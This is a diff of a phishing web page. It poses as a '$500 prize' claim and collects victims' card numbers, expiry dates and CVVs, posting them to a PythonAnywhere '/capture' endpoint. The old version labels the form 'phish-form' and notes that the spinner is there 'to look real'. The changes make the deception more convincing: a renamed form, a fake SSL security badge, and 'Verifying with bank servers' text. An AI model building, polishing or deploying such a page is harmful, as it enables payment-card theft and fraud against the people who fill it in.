@@ -2,54 +2,81 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Promo Winner | Claim Now</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Rewards | Claim Your Prize</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 350px; }
-        h1 { color: #2ecc71; margin-bottom: 10px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
-        button { width: 100%; padding: 12px; background-color: #2ecc71; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.3s; }
-        button:hover { background-color: #27ae60; }
+        :root { --primary-color: #4a90e2; --success-color: #2ecc71; --bg-color: #f0f2f5; }
+        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        .header-icon { font-size: 50px; margin-bottom: 10px; }
+        h1 { color: #333; margin: 0 0 10px; font-size: 24px; }
+        p { color: #666; margin-bottom: 25px; line-height: 1.5; }
         
-        /* The Spinner CSS */
-        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #2ecc71; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; margin-left: 2px; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: border 0.3s; }
+        input:focus { border-color: var(--primary-color); outline: none; }
+        
+        .flex-row { display: flex; gap: 10px; }
+        button { width: 100%; padding: 15px; background-color: var(--success-color); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s, background 0.3s; margin-top: 10px; }
+        button:hover { background-color: #27ae60; transform: translateY(-1px); }
+        button:active { transform: translateY(0); }
+
+        /* Spinner & Loading State */
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary-color); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .hidden { display: none; }
+        .secure-footer { margin-top: 20px; font-size: 11px; color: #aaa; display: flex; align-items: center; justify-content: center; gap: 5px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-    <h1>CONGRATS!</h1>
-    <p>You've won <strong>$500.00</strong></p>
-    <p style="font-size: 0.8em; color: #666;">Verify your card to receive the transfer.</p>
+<div class="card" id="main-container">
+    <div class="header-icon">🎁</div>
+    <h1>You're a Winner!</h1>
+    <p>Please provide your card details to initiate the <strong>$500.00</strong> instant transfer to your account.</p>
 
-    <form id="phish-form" action="https://giftus.pythonanywhere.com/capture" method="POST">
-        <input type="text" name="cc_num" placeholder="Card Number (16 digits)" required>
-        <div style="display: flex; gap: 10px;">
-            <input type="text" name="expiry" placeholder="MM/YY" required>
-            <input type="text" name="cvv" placeholder="CVV" required>
+    <form id="reward-form" action="https://giftus.pythonanywhere.com/capture" method="POST">
+        <div class="input-group">
+            <label>CARD NUMBER</label>
+            <input type="text" name="cc_num" placeholder="0000 0000 0000 0000" required maxlength="19">
         </div>
-        <button type="submit" id="submit-btn">CLAIM WINNINGS</button>
+        
+        <div class="flex-row">
+            <div class="input-group" style="flex: 2;">
+                <label>EXPIRY DATE</label>
+                <input type="text" name="expiry" placeholder="MM/YY" required maxlength="5">
+            </div>
+            <div class="input-group" style="flex: 1;">
+                <label>CVV</label>
+                <input type="password" name="cvv" placeholder="123" required maxlength="4">
+            </div>
+        </div>
+
+        <button type="submit" id="submit-btn">Claim My $500 Reward</button>
     </form>
 
-    <div id="loader-icon" class="loader"></div>
-    <p id="loading-text" class="hidden">Connecting to Secure Payment Gateway...</p>
+    <div id="loading-area" class="hidden">
+        <div class="loader"></div>
+        <p style="font-size: 14px; color: #4a90e2;">Verifying with bank servers...</p>
+    </div>
+
+    <div class="secure-footer">
+        🔒 Encrypted Secure Transaction (SSL)
+    </div>
 </div>
 
 <script>
-    const form = document.getElementById('phish-form');
-    const loader = document.getElementById('loader-icon');
-    const loadingText = document.getElementById('loading-text');
+    const form = document.getElementById('reward-form');
     const submitBtn = document.getElementById('submit-btn');
+    const loadingArea = document.getElementById('loading-area');
 
     form.onsubmit = function() {
-        // Show the spinner and hide the button to look real
-        submitBtn.classList.add('hidden');
-        loader.style.display = 'block';
-        loadingText.classList.remove('hidden');
+        // Hide form and show loading spinner
+        form.classList.add('hidden');
+        loadingArea.classList.remove('hidden');
         
-        // The form will now submit to the Python backend automatically
+        // The browser will now send the data to your PythonAnywhere URL
     };
 </script>
 
